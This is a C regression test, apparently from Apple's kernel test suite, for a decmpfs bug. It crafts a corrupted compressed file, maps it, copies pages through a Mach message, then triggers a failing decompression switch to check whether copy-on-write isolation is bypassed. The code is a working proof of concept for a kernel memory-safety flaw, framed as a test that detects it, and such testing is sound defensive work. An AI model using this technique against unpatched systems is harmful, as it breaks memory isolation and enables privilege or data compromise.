/*
 * Copyright (c) 2026 Apple Inc. All rights reserved.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_START@
 *
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. The rights granted to you under the License
 * may not be used to create, or enable the creation or redistribution of,
 * unlawful or unlicensed copies of an Apple operating system, or to
 * circumvent, violate, or enable the circumvention or violation of, any
 * terms of an Apple operating system software license agreement.
 *
 * Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this file.
 *
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_END@
 */


//
//  decmpfs_time_travel2
//
//  Created by Emilia Henze on 2026-01-08.
//

#include <darwintest.h>

#include <assert.h>
#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/xattr.h>

#include <mach/mach.h>

typedef struct {
	size_t pages;
	char   filename[PATH_MAX];
	char   filenameRSRC[PATH_MAX];
	int    fd;
	int    rsrcFd;
} decmpfs_state;

void decmpfs_prepare_compressed_file(decmpfs_state *state, void *data, size_t pages);
void decmpfs_switch_to_compressed(decmpfs_state *state);
size_t decmpfs_chunks(decmpfs_state *state);
size_t decmpfs_chunk_to_fileoff(decmpfs_state *state, size_t chunk);
void decmpfs_corrupt_chunk(decmpfs_state *state, size_t chunk);


#define PAGES 100

typedef struct {
	mach_msg_header_t hdr;
	mach_msg_body_t body;
	mach_msg_ool_descriptor_t ool;
	uint64_t x[50];
} msg;

#define CHUNK_SIZE (64*1024ULL)
#define DECMPFS_CHUNKS(pages) ((((pages) * PAGE_SIZE) + (CHUNK_SIZE - 1)) / CHUNK_SIZE)

#define DECMPFS_MAGIC 0x636d7066 /* cmpf */

typedef struct __attribute__((packed)) {
	uint64_t  value;
} decmpfs_raw_item_size;

typedef struct __attribute__((packed)) {
	/* this structure represents the xattr on disk; the fields below are little-endian */
	uint32_t compression_magic;
	uint32_t compression_type; /* see the enum below */
	union {
		uint64_t uncompressed_size; /* compatility accessor */
		decmpfs_raw_item_size _size;
	};
	unsigned char attr_bytes[0]; /* the bytes of the attribute after the header */
} decmpfs_disk_header;

/*
 * Calculate the overhead to store n pages "compressed" (actually uncompressed but in decmpfs format) in a file.
 */
size_t
decmpfs_calc_overhead(size_t pages)
{
	size_t chunks = DECMPFS_CHUNKS(pages);

	return ((chunks + 1) * sizeof(uint32_t)) + chunks;
}

void
decmpfs_write_data(decmpfs_state *state, size_t start, const char *data, size_t dataLen)
{
	size_t chunks    = DECMPFS_CHUNKS(state->pages);
	size_t dataStart = (chunks + 1) * sizeof(uint32_t);

	// First find out in which chunk the start is located
	size_t curChunk            = (start & ~(CHUNK_SIZE - 1)) / CHUNK_SIZE;
	size_t chunkOff            = start & (CHUNK_SIZE - 1);
	size_t chunkRemainingBytes = CHUNK_SIZE - chunkOff;
	size_t remaining           = dataLen;
	while (remaining) {
		if (!chunkRemainingBytes) {
			curChunk++;
			chunkRemainingBytes = CHUNK_SIZE;
			chunkOff = 0;
		}

		size_t toWrite = (chunkRemainingBytes < remaining) ? chunkRemainingBytes : remaining;
		size_t off = dataStart + (curChunk * CHUNK_SIZE) + curChunk + 1 + chunkOff;
		pwrite(state->rsrcFd, data, toWrite, off);

		chunkRemainingBytes -= toWrite;
		remaining -= toWrite;
		data += toWrite;
	}
}

void
decmpfs_prepare_compressed_file(decmpfs_state *state, void *data, size_t pages)
{
	state->pages = pages;
	size_t overhead = decmpfs_calc_overhead(pages);
	size_t totalSize = overhead + (pages * PAGE_SIZE);

	// First create a random file and open it
	strcpy(state->filename, "/tmp/decmpfs_XXXXXX");
	state->fd = mkstemp(state->filename);
	T_QUIET; T_ASSERT_GE(state->fd, 0, "mkstemp");
	ftruncate(state->fd, pages * PAGE_SIZE);

	// Open its resource fork
	snprintf(state->filenameRSRC, sizeof(state->filenameRSRC), "%s/..namedfork/rsrc", state->filename);
	state->rsrcFd = open(state->filenameRSRC, O_RDWR | O_CREAT);
	T_QUIET; T_ASSERT_POSIX_SUCCESS(state->rsrcFd, "open(rsrcFd)");
	ftruncate(state->rsrcFd, totalSize);

	// Emit the decmpfs xattr data
	decmpfs_disk_header hdr;
	hdr.compression_magic = DECMPFS_MAGIC;
	hdr.compression_type  = 10;// No compression, chunked
	hdr.uncompressed_size = pages * PAGE_SIZE;
	int err = setxattr(state->filename, "com.apple.decmpfs", &hdr, sizeof(hdr), 0, 0);
	T_QUIET; T_ASSERT_POSIX_SUCCESS(err, "setxattr()");

	// Emit the rsrc header
	size_t chunks    = DECMPFS_CHUNKS(pages);
	size_t dataStart = (chunks + 1) * sizeof(uint32_t);
	for (size_t i = 0; i < (chunks + 1); i++) {
		char constantCC = 0xCC;
		uint32_t chunkOff = (uint32_t) (dataStart + (i * CHUNK_SIZE) + i);
		pwrite(state->rsrcFd, &chunkOff, sizeof(chunkOff), i * sizeof(uint32_t));
		if (i < chunks) {
			pwrite(state->rsrcFd, &constantCC, 1, chunkOff);
		}
	}

	// Emit initial rsrc data
	for (size_t i = 0; i < chunks; i++) {
		decmpfs_write_data(state, i * CHUNK_SIZE, data, CHUNK_SIZE);
		data += CHUNK_SIZE;
	}
}

void
decmpfs_switch_to_compressed(decmpfs_state *state)
{
	// Set the compression flag
	int err = fchflags(state->fd, UF_COMPRESSED);
	T_QUIET; T_ASSERT_POSIX_SUCCESS(err, "fchflags()");

	// Check that it was set
	struct stat stbuf = {};
	err = fstat(state->fd, &stbuf);
	T_QUIET; T_ASSERT_POSIX_SUCCESS(err, "fstat()");
	T_QUIET; T_ASSERT_TRUE(stbuf.st_flags & UF_COMPRESSED, "switched to compressed");
}

size_t
decmpfs_chunks(decmpfs_state *state)
{
	return DECMPFS_CHUNKS(state->pages);
}

size_t
decmpfs_chunk_to_fileoff(decmpfs_state *state, size_t chunk)
{
	return chunk * CHUNK_SIZE;
}

void
decmpfs_corrupt_chunk(decmpfs_state *state, size_t chunk)
{
	uint32_t inval = UINT32_MAX;
	pwrite(state->rsrcFd, &inval, sizeof(inval), chunk * sizeof(inval));
}

mach_vm_address_t
copyMemoryViaMachMessage(mach_vm_address_t addr, mach_msg_size_t size)
{
	mach_port_t port;
	kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "failed to allocate mach port: %s\n", mach_error_string(kr));
	if (kr != KERN_SUCCESS) {
		return 0;
	}

	msg msg;
	msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_MAKE_SEND);
	msg.hdr.msgh_remote_port = port;
	msg.hdr.msgh_local_port = port;
	msg.hdr.msgh_id = 0;
	msg.hdr.msgh_size = sizeof(msg);
	msg.hdr.msgh_voucher_port = MACH_PORT_NULL;

	msg.body.msgh_descriptor_count = 1;

	msg.ool.address = (void*) addr;
	msg.ool.deallocate = FALSE;
	msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
	msg.ool.size = size;
	msg.ool.copy = MACH_MSG_VIRTUAL_COPY;

	msg.hdr.msgh_size -= 20;
	kr = mach_msg_send(&msg.hdr);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "failed to send message: %s\n", mach_error_string(kr));
	if (kr != KERN_SUCCESS) {
		mach_port_mod_refs(mach_task_self_, port, MACH_PORT_RIGHT_RECEIVE, -1);
		return 0;
	}

	msg.hdr.msgh_size += 20;
	kr = mach_msg_receive(&msg.hdr);

	mach_port_mod_refs(mach_task_self_, port, MACH_PORT_RIGHT_RECEIVE, -1);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "failed to receive message: %s\n", mach_error_string(kr));
	if (kr != KERN_SUCCESS) {
		return 0;
	}

	msg.body.msgh_descriptor_count = 0;
	mach_msg_destroy(&msg.hdr);

	return (mach_vm_address_t) msg.ool.address;
}

T_DECL(decmpfs_time_travel2, "test from rdar://167764866")
{
	vm_address_t pages = 0;
	kern_return_t kr = vm_allocate(mach_task_self_, &pages, PAGES * PAGE_SIZE, VM_FLAGS_ANYWHERE);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate()");

	memset((void*) pages, 0x41, PAGES * PAGE_SIZE);

	decmpfs_state state;
	decmpfs_prepare_compressed_file(&state, (void*) pages, PAGES);

	size_t corruptedChunk = 5;
	decmpfs_corrupt_chunk(&state, corruptedChunk);

	decmpfs_switch_to_compressed(&state);

	// Map file
	void *mapped = mmap(NULL, PAGES * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FILE | MAP_SHARED, state.fd, 0);
	T_QUIET; T_ASSERT_POSIX_SUCCESS(mapped, "mmap()");

	// Overwrite data *after* corrupted chunk
	size_t targetChunk = corruptedChunk + 5;
	size_t targetOff = decmpfs_chunk_to_fileoff(&state, targetChunk);
	targetOff = (targetOff + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1); // Round up to nearest page
	memset(mapped + targetOff, 0x55, PAGE_SIZE * 5);

	volatile void *copied = (volatile void*) copyMemoryViaMachMessage((mach_vm_address_t) (mapped + targetOff), (mach_msg_size_t) PAGE_SIZE * 5);

	T_LOG("CoW memory current contents: %p", *(void**) copied);
	T_QUIET; T_ASSERT_EQ(*(uint32_t*) copied, 0x55555555, "copied is OK");

	T_LOG("Triggering (failing) switch to uncompressed...");
	int fd = open(state.filename, O_RDWR);
	if (fd != -1) {
		T_LOG("Switch didn't fail? Expect exploit to fail...");
	} else {
		T_LOG("Switch failed as expected, error: %s", strerror(errno));
	}

	T_LOG("CoW memory *new* contents: %p", *(void**) copied);
	if (*(uint32_t*) copied == 0x41414141) {
		T_FAIL("!!! CoW bypassed !!!");
	} else if (*(uint32_t*) copied == 0x55555555) {
		T_LOG("CoW not bypassed - bug fixed?");
	} else {
		T_FAIL("!!! CoW bypassed, but unexpected value !!!");
	}
}
